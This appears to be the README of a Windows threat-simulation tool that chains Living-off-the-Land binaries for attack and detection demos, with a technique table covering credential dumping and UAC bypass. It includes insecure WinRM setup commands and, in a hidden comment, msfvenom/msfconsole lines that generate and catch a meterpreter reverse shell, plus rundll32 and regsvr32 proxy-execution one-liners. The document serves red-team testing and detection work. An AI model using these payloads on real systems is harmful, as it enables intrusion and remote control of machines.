# Build-Your-Own-LOLBins
[![Python 3.x](https://img.shields.io/badge/python-3.10.9-yellow.svg?style=for-the-badge)](https://www.python.org/) 
![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)

Build Your Own LOLBins (BYOL) is a threat simulation platform used for demonstrating the weaponization and detection
of Living-off-the-Land binaries native to the Windows Operating System. 

## Inspiration
This project is highly inspired by [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and aims to expand beyond the scope of that by eliminating atomicity in individual test cases and providing flexibility in customization.

## Featues
* LOLBins Chaining
* Self-Cleanup
* Commandline Obfuscation
  * Globufscation Wildcards
  * Character Substitution
* Customizable Payloads
* Custom Templates
* APT Procedural Examples
* MITRE ATT&CK Framework Support

## Installation
The technical requirements of this project are:
* Python 3.10.9
* Windows 10 64-bit (Victim Virtual Machine)
<br>

**NOTE**: BYOL uses Windows Remote Management (WinRM) to communicate with the remote host.

> To enable WinRM on the victim machine:
```
$ winrm quickconfig
$ winrm set winrm/config/service '@{AllowUnencrypted="true"}'
$ winrm set winrm/config/service/auth '@{Basic="true"}'
$ netsh advfirewall firewall add rule name="WinRM-HTTP" dir=in localport=5985 protocol=TCP action=allow
$ Set-NetConnectionProfile -NetworkCategory Private
```

## Technique Coverage
| LOLBins | Variants | Objectives |
|:-----|:---------:|:-----------|
Certutil.exe | 5 | `Download` `ADS` `Encode` `Decode`
Msiexec.exe | 1 | `Execute`
Regsvr32.exe | 3 | `Execute` `AWL Bypass`
Cmstp.exe | 1 | `Execute`
Esentutl.exe | 2 | `ADS` `Credentials Dumping`
Rdrleakdiag.exe | 1 | `Credentials Dumping`
Makecab.exe | 1 | `Conceal`
Extract32.exe | 1 | `Decode`
Reg.exe | 3 | `AWL Bypass` `UAC Bypass`
Verclsid.exe | 1 | `Execute`
Regedit.exe | 1 | `Upload`
Mavinject.exe | 1 | `Execute`
Bitsadmin.exe | 1 | `Download`
Expand.exe | 2 | `Copy` `ADS`
Cscript.exe | 2 | `Execute`
Rundll32.exe | 7 | `Execute` `Download`
Mshta.exe | 3 | `Execute` `Download`
Wuauclt.exe | 1 | `Execute`
Eventvwr.exe | 1 | `UAC Bypass`
Pcalua.exe | 2 | `Execute`
Wmic.exe | 3 | `Execute`
Cmd.exe | 1 | `Execute`
Powershell.exe | 4 | `Execute`

## To-Do
- [X] Export Report + JSON
- [ ] ChatGPT Source Code Review
- [ ] WinRM Exceptions
- [ ] self.client_address[0]
<!-- 
**PRODUCTION DEPLOYMENT:**
```
$ & c:/Users/Wesley/Documents/BYOL/venv/Scripts/Activate.ps1
env> python manage.py runserver
env> python manage.py runserver --insecure
env> python manage.py makemigrations
env> python manage.py migrate
env> python manage.py celery
env> python -m pip install pywinrm
```

## Usage

## Limitations
* Use Local Administrator Account
* Recommended to Disable Antivirus
* Recommended to use Cleanup with ErrorLevel
* Recommended to put Cleanup before Verification for accurate result
* Require user to manually close certain GUI Error Box so that scan can continue especially when antivirus is enabled (Rundll32)
* Does not recommend customization, although available
* All command behind an ampersand "&" will be passed into cmd.exe

## CSS Components
* CSS + HTML + jQuery + Ajax
* Bootstrap
  * Select2
  * Alerts
  * Cards
  * Accordion + Collapse
  * Offcanvas + Backdrop
  * Table + DataTable
  * Breadcrumb
* Celery + Redis

## Note
```
IF NOT EXIST %TEMP%\byol.dll EXIT 2
Start-Process regsvr32 $env:TEMP\byol.dll

msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.127.131 LPORT=4444 -f csharp
sudo msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_http;set LHOST 192.168.127.131;set LPORT 4444;run -j"
(for /f "tokens=5" %a in ('netstat -ano ^| find ":4444" ') do taskkill /f /pid %a)

regasm
regsvcs
rundll32.exe advpack.dll, #+12 calc.exe
rundll32.exe zipfldr,RouteTheCall calc.exe
rundll32.exe url,OpenURL file://c:\windows\system32\calc.exe
rundll32.exe url.dll,FileProtocolHandler calc.exe
```
 -->
